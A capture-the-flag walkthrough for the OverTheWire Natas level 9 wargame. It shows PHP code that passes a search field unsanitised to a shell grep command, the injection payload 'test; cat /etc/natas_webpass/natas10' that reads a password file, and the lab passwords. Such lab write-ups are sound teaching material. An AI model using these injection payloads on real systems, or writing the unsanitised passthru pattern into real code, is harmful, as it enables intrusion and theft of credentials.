# Natas9 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas9
Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
URL: http://natas9.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.
- It's command injection time babyyyy!

  ```
  <html>
  <head>
  <!-- This stuff in the header has nothing to do with the level -->
  <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
  <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
  <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
  <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
  <script>var wechallinfo = { "level": "natas9", "pass": "<censored>" };</script></head>
  <body>
  <h1>natas9</h1>
  <div id="content">
  <form>
  Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
  </form>
  
  
  Output:
  <pre>
  <?
  $key = "";
  
  if(array_key_exists("needle", $_REQUEST)) {
      $key = $_REQUEST["needle"];
  }
  
  if($key != "") {
      passthru("grep -i $key dictionary.txt");
  }
  ?>
  </pre>
  
  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
  </div>
  </body>
  </html>
  ```
  
- Just insert the basic payload `test; cat /etc/natas_webpass/natas10` and you will get a password for natas10.

---

## 🏁 Password for the next level

`natas10 password is t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
